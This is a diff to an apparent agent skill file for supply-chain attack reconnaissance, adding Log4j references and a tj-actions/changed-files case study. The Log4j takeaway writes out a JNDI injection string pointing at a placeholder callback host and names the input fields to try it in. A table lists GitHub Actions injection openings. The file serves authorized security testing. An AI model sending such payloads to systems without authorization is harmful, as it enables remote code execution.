@@ -1,9 +1,10 @@
 ---
 name: supply-chain-attack-recon
-description: External recon for software supply-chain attack surface — package-namespace squatting candidates, dependency-confusion vulnerabilities, GitHub Actions injection openings, container image registry exposure, SBOM mining, internal-package-name leakage, and CI/CD configuration exposure. Reconnaissance and identification ONLY — actual package publishing / typosquat attacks are EXTERNAL-OFFENSIVE and require explicit written sign-off because they can affect the entire npm/PyPI ecosystem. Use when the target has a public GitHub org, when their build artifacts/SBOMs are reachable, when their docker images are on Docker Hub/GHCR, or when you find internal package names in their JS bundles.
+description: "External recon for software supply-chain attack surface — package-namespace squatting candidates, dependency-confusion vulnerabilities, GitHub Actions injection openings, container image registry exposure, SBOM mining, internal-package-name leakage, and CI/CD configuration exposure. Reconnaissance and identification ONLY — actual package publishing / typosquat attacks are EXTERNAL-OFFENSIVE and require explicit written sign-off because they can affect the entire npm/PyPI ecosystem. Use when the target has a public GitHub org, when their build artifacts/SBOMs are reachable, when their docker images are on Docker Hub/GHCR, or when you find internal package names in their JS bundles."
 sources: alex-birsan-dependency-confusion, supply-chain-research, github-actions-security, cisa-advisories, mandiant-tag, github-security-blog, snyk-research
-report_count: 12
 ---
+
+# Supply-Chain Attack Recon
 
 ## When to use
 
@@ -221,7 +222,7 @@ done
 |---|---|
 | `pull_request_target` + `actions/checkout` with `ref: pull_request.head.sha` + uses repo secrets | **Critical** — RCE on runner with org secrets |
 | `${{ github.event.pull_request.title }}` interpolated into shell | **Critical** — script injection via PR title |
-| Third-party action pinned to a mutable tag (`uses: org/repo@v1` / `@main`) instead of a commit SHA | **High** — repointable supply-chain vector (see case #9) |
+| Third-party action pinned to a mutable tag (`uses: org/repo@v1` / `@main`) instead of a commit SHA | **High** — repointable supply-chain vector (see case #9, tj-actions/changed-files) |
 | Self-hosted runner reachable from public repo workflows | **High** — persistent attacker pivot |
 | Issue-comment-triggered workflow that runs `gh` with token | **High** |
 | Workflow downloads from URL that target controls | **Medium** |
@@ -393,7 +394,7 @@ Each of these is worth reading for what made the attack effective and what red f
 
 ## Disclosed-case catalogue (citations)
 
-Twelve well-documented public cases, mapped to the recon surface above. Each entry: attack name, year, flow, root cause, impact, references, and the recon-skill takeaway.
+Nine well-documented public cases, mapped to the recon surface above. Each entry: attack name, year, flow, root cause, impact, references, and the recon-skill takeaway.
 
 ### 1. SolarWinds Orion / SUNBURST (CISA AA20-352A, Dec 2020)
 
@@ -484,6 +485,22 @@ Twelve well-documented public cases, mapped to the recon surface above. Each ent
 - **Root cause:** Unsafe-by-default feature shipped in 2013 (`MessageLookup` substitution); deeply nested transitive dependency made inventory and patching almost impossible.
 - **Impact:** "Most critical vulnerability in a decade" per CISA Director Jen Easterly. Affected every major cloud, every Apache product, every Java enterprise stack. Ongoing mass exploitation by Conti, Khonsari ransomware, state actors.
 - **References:**
+  - NVD entry: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  - Apache Log4j security advisory: https://logging.apache.org/log4j/2.x/security.html
+  - CISA guidance: https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance
+  - LunaSec deep-dive: https://www.lunasec.io/docs/blog/log4j-zero-day/
+- **Recon takeaway:** You cannot recon "is the target running Log4j" from outside reliably, but you CAN test the canonical exploit string in any logged input field (User-Agent, search boxes, form fields) with an OOB callback (interactsh/Burp Collaborator) pointed at `${jndi:ldap://<oob-host>/x}`. A DNS/LDAP hit back proves a vulnerable transitive dependency you'd never see in their package manifest — the whole lesson of this case is that the blast radius lives deep in the dependency tree.
+
+### 9. tj-actions/changed-files GitHub Action compromise (CVE-2025-30066, March 2025)
+
+- **Flow:** Attackers compromised the popular `tj-actions/changed-files` GitHub Action and retroactively repointed its version tags (e.g. `v35` … `v44.5.1`) at a malicious commit. Workflows referencing the action by mutable tag pulled the poisoned code, which dumped the runner's memory and printed CI/CD secrets (tokens, cloud keys) into publicly readable build logs. Tens of thousands of repositories consumed the action.
+- **Root cause:** Mutable tag references (`uses: org/repo@v44`) instead of full-length commit SHAs let a single compromised action repo silently retarget every downstream consumer — the exact "unpinned third-party action" pattern this skill flags. Compromise reportedly chained from an earlier `reviewdog` action compromise that leaked a `tj-actions` token.
+- **Impact:** Mass secret exposure across CI logs; CISA added it to the Known Exploited Vulnerabilities catalog. The canonical modern proof that "pin to a tag" is a supply-chain blast radius.
+- **References:**
+  - NVD entry: https://nvd.nist.gov/vuln/detail/CVE-2025-30066
+  - CISA KEV / advisory: https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066
+  - StepSecurity analysis: https://www.stepsecurity.com/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised
+- **Recon takeaway:** Grep the target's public `.github/workflows/` for `uses:` lines pinned to a mutable tag (`@v1`, `@main`, `@latest`) rather than a 40-char commit SHA — each one is a repointable supply-chain vector. Recon output: "N workflows consume third-party actions by mutable tag; any upstream compromise lands code on their runners with their secrets."
 
 ## Extended Content
 
